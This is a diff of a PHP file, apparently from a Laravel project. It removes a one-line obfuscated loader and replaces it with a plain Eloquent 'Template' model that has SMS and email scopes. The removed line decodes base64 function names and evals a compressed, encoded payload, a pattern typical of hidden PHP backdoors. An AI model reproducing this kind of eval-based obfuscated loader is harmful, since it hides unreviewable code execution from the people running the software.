@@ -1,1 +1,23 @@
-<?php $_='4225bb77';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqNU0tvozAQvu+v4LASjbQH0zTbRVEOgYZXKrohLTa+VLFNgcQQtKTh8et3IEmbai9ryXgYz3zzzYxHUU7r++vnmqlvOmP6raar0+8nRfknKw5v6vSbcmU/U1Si6UeGwyJazWaq8nl9wZuBqPI8RIJ4765pSJFb1dIM3oj2q3yqeyflK+irogxObFPFP+9eRcz3Ilan/1B8WO19M5+kEL3jtrWla8PgjsGfsb6juOmearR8WJUav31J1ripBNZKlluIhs0iIkEa5VYHssVsvRE4fBdWY0fYR2zslZT4fG1bXZBbW2Hrbfxc+WYRdhDDY3ajMSzfAUOSRZAK28oi4oMcVmxsaRRPEFloR2qH1ZnDlgEWb40XirUaZAQ4MnYCyfKgc8+2YHcPOSWuOU8E4LmLNOWIptE4OPJidz/km83h3qh5riMKXCleJZ5NS+AE+TTSfUAJbj20IUFF127lmt4OctnyXNbClkeWDToUE0O6WZ24uX9kBfAoVhnpc0zQso/vOoYGeGXUGrnAk+3J1+iiW72moX/gbbLjJJTAq7xwjuuz77CNlpJA4/ld4jlQE+JNHp8n440dtnSdZMKR9Ymfqw88ih7TLZ8uGA76Py4v4SHCsn9QfQ/beL271OijlicMTwonbFk2v/A+/C7EHnjJ5XU9tih7NOcZ9Cnd4Dpb9jU54enQH9j72dUMXD3z4bw5/42GqbnSjaYXy0F5o/Zf9ceH+dcBOOPcXL/30Wj6Fx+nKCU='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Template extends Model
+{
+    use HasFactory;
+
+    protected $fillable = ["title", "description", "type", "content"];
+
+    public function scopeSms($query)
+    {
+        return $query->where("type", "=", "sms");
+    }
+
+    public function scopeEmail($query)
+    {
+        return $query->where("type", "=", "email");
+    }
+}
